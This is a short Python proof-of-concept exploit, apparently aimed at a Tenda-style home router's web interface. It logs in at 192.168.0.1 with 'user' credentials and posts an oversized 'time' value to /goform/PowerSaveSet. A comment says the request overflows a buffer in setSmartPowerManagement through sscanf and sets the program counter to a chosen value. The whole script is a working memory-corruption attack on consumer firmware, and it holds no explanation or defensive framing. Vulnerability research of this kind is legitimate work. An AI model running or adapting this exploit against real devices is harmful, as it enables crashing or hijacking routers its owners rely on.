#!/usr/bin/env python3

# series of bof in setSmartPowerManagement - 0x4d7924, using sscanf to trigger and get $pc to point to 0x626262

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
p = {'time':'00:00-00:'+'a'*0x130 + 'bbb'}
t.post_request('/goform/PowerSaveSet', p)
